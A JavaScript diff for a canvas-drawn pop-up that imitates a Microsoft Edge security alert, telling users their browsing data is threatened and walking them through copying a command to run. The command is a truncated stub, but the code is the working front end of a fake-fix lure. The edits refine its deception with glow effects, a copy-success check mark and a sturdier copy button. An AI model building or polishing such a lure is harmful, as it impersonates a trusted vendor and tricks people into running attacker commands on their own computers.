@@ -43,13 +43,15 @@ const colors = {
   cmdBottom: '#101010',
   cmdText: '#9cf59c',
   copyNormal: '#888',
-  copyHover: '#4ade80'
+  copyHover: '#4ade80',
+  glowColor: '#4ade80'
 };
 
 let copied = false;
 let highlightTime = 0;
 let mouseX = 0;
 let mouseY = 0;
+let cmdBoxY = 0;
 
 const command = 'msedge.exe --fix hash=qzyd....';
 
@@ -90,18 +92,17 @@ function draw() {
 
   // Main background
   ctx.fillStyle = colors.bg;
-  ctx.shadowColor = 'rgba(0,0,0,0.3)';
-  ctx.shadowBlur = 16;
-  ctx.shadowOffsetX = 0;
-  ctx.shadowOffsetY = 4;
+  ctx.shadowColor = 'rgba(0,0,0,0.4)';
+  ctx.shadowBlur = 20;
+  ctx.shadowOffsetY = 6;
   roundRect(ctx, 0, 0, 520, 480, 10);
   ctx.fill();
   ctx.shadowColor = 'transparent';
   ctx.strokeStyle = colors.border;
-  ctx.lineWidth = 1;
+  ctx.lineWidth = 1.5;
   ctx.stroke();
 
-
+  // Header
   const headerGrad = ctx.createLinearGradient(0, 0, 0, 68);
   headerGrad.addColorStop(0, colors.headerTop);
   headerGrad.addColorStop(1, colors.headerBottom);
@@ -109,18 +110,17 @@ function draw() {
   roundRect(ctx, 0, 0, 520, 68, 10);
   ctx.fill();
   ctx.strokeStyle = '#3a3a3a';
+  ctx.lineWidth = 1;
   ctx.beginPath();
   ctx.moveTo(0, 68);
   ctx.lineTo(520, 68);
   ctx.stroke();
 
-
   ctx.fillStyle = colors.accent;
-  ctx.font = 'bold 40px Segoe UI';
+  ctx.font = 'bold 42px Segoe UI';
   ctx.textAlign = 'left';
   ctx.textBaseline = 'middle';
   ctx.fillText('⚠', 28, 34);
-
 
   ctx.fillStyle = colors.accent;
   ctx.font = '600 19px Segoe UI';
@@ -128,18 +128,17 @@ function draw() {
 
   let y = 100;
 
-
+  // Warning text
   ctx.fillStyle = colors.lightText;
   ctx.font = '15px Segoe UI';
   wrapText(ctx, "Microsoft Edge has detected potential security threats that may compromise your browsing data.", 32, y, 456, 24);
   y += 78;
 
-
+  // Steps
   ctx.fillStyle = colors.text;
   ctx.font = '600 15px Segoe UI';
   ctx.fillText('Follow these steps to fix it:', 32, y);
   y += 32;
-
 
   const steps = [
     {num: '1', text: 'Copy the command below'},
@@ -149,9 +148,8 @@ function draw() {
 
   steps.forEach(step => {
     ctx.save();
-    ctx.shadowColor = 'rgba(0,0,0,0.3)';
-    ctx.shadowBlur = 4;
-    ctx.shadowOffsetX = 0;
+    ctx.shadowColor = 'rgba(0,0,0,0.4)';
+    ctx.shadowBlur = 5;
     ctx.shadowOffsetY = 2;
     ctx.fillStyle = '#3a3a3a';
     ctx.beginPath();
@@ -172,7 +170,7 @@ function draw() {
 
   y += 12;
 
-
+  // Info box
   const infoGrad = ctx.createLinearGradient(30, y, 30, y + 72);
   infoGrad.addColorStop(0, colors.infoTop);
   infoGrad.addColorStop(1, colors.infoBottom);
@@ -188,13 +186,17 @@ function draw() {
   ctx.fillText('Then follow the steps above to execute it.', 48, y + 48);
 
   y += 90;
+  cmdBoxY = y;
 
-
+  // Command box
+  const isHighlight = highlightTime > Date.now();
   const cmdGrad = ctx.createLinearGradient(30, y, 30, y + 52);
   cmdGrad.addColorStop(0, colors.cmdTop);
   cmdGrad.addColorStop(1, colors.cmdBottom);
-  ctx.fillStyle = highlightTime > Date.now() ? '#2a3a2a' : cmdGrad;
-  ctx.strokeStyle = highlightTime > Date.now() ? '#4ade80' : '#555';
+
+  ctx.fillStyle = isHighlight ? '#2a3a2a' : cmdGrad;
+  ctx.strokeStyle = isHighlight ? '#4ade80' : '#555';
+  ctx.lineWidth = 1.5;
   roundRect(ctx, 30, y, 460, 52, 4);
   ctx.fill();
   ctx.stroke();
@@ -204,14 +206,41 @@ function draw() {
   ctx.textAlign = 'left';
   ctx.fillText(command, 48, y + 32);
 
+  // === COPY BUTTON ===
+  const btnX = 460;
+  const btnY = y + 26;           // center of button
   const isHover = (mouseX > 430 && mouseX < 490 && mouseY > y && mouseY < y + 52) || copied;
+
+  // Glow on hover
+  if (isHover && !copied) {
+    ctx.shadowColor = colors.glowColor;
+    ctx.shadowBlur = 18;
+    ctx.shadowOffsetX = 0;
+    ctx.shadowOffsetY = 0;
+  } else if (copied) {
+    ctx.shadowColor = '#4ade80';
+    ctx.shadowBlur = 12;
+  } else {
+    ctx.shadowBlur = 0;
+  }
+
   ctx.textAlign = 'center';
-  ctx.fillStyle = isHover ? colors.copyHover : colors.copyNormal;
-  ctx.font = '20px Segoe UI';
-  ctx.fillText('📋', 460, y + 34);
+  ctx.textBaseline = 'middle';
+  ctx.font = '22px Segoe UI';
 
   if (copied && Date.now() - highlightTime < 1800) {
-    ctx.fillStyle = 'rgba(74,222,128,0.2)';
+    ctx.fillStyle = '#4ade80';
+    ctx.fillText('✓', btnX, btnY);
+  } else {
+    ctx.fillStyle = isHover ? colors.copyHover : colors.copyNormal;
+    ctx.fillText('📋', btnX, btnY);
+  }
+
+  ctx.shadowBlur = 0; // reset shadow
+
+  // Success overlay
+  if (copied && Date.now() - highlightTime < 1800) {
+    ctx.fillStyle = 'rgba(74, 222, 128, 0.18)';
     roundRect(ctx, 30, y, 460, 52, 4);
     ctx.fill();
   }
@@ -224,14 +253,14 @@ canvas.addEventListener('mousemove', e => {
   draw();
 });
 
-
 canvas.addEventListener('click', e => {
   const rect = canvas.getBoundingClientRect();
   const clickX = e.clientX - rect.left;
   const clickY = e.clientY - rect.top;
 
-  
-  if (clickX > 430 && clickX < 490 && clickY > 340 && clickY < 392) {
+  if (clickX > 430 && clickX < 490 && 
+      clickY > cmdBoxY && clickY < cmdBoxY + 52) {
+    
     navigator.clipboard.writeText(command).then(() => {
       copied = true;
       highlightTime = Date.now();
@@ -242,9 +271,8 @@ canvas.addEventListener('click', e => {
         draw();
       }, 1800);
     }).catch(err => {
-      console.error('Failed to copy text: ', err);
-
-      alert('Failed to copy the command. Please copy it manually.');
+      console.error('Copy failed:', err);
+      alert('Failed to copy. Please copy manually.');
     });
   }
 });
